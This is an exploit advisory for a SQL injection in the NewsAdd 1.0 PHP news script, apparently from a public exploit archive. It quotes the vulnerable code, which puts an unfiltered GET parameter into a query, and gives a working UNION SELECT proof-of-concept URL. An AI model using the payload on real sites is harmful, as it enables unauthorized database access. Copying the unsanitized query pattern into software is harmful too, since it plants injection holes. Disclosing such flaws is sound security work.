@@ -1,0 +1,37 @@
+##########################################################################
+## NewsAdd <= 1.0 (lerNoticia.php) Remote SQL Injection
+## Google Dork: n/a
+## Bug discovered by Pr0T3cT10n, <pr0t3ct10n@gmail.com>
+## Date: 31/05/2012
+## Version: 1.0
+## Software Link: http://phpbrasil.com/script/3tCyUs1JeL1M/newsadd--mysql
+## ISRAEL
+##########################################################################
+##          Author will be not responsible for any damage.
+##########################################################################
+##      **YOU SHOULD BE LOGGED IN** | **YOU SHOULD BE LOGGED IN**
+##########################################################################
+## Vulnerable Code - lerNoticia [15-22]:
+21.if ($_GET) {
+22.
+23.	$id = $_GET['id'];
+24.	
+25.	$query = "SELECT * FROM noticia WHERE id = '$id'";
+26.	$sql = mysql_query($query);
+27.
+28.	while($row = mysql_fetch_array($sql)) {
+29.
+30.		echo "<strong><br>" . $row['titulo'] . "</strong> - postado em " . $row['data'] . "<br>" . $row['noticia'] . "<br>";
+31.		echo "<a href='comentar.php?id=$row[0]'>comentar not?cia</a><br><br><hr>";
+32.
+33.	}
+34.
+## NOTE:
+## As you can see there is no validation or any filter to variable $id.
+## See line 23. so you can inject sql query by using $id variable;
+## SQL Injection PoC:
+## http://www.example.com/newsadd/lerNoticia.php?id=-0'+union+all+select+1,2,VERSION(),4,5+from+usuarios--+
+##########################################################################
+# Cya :)
+# 0x31337.net
+##########################################################################
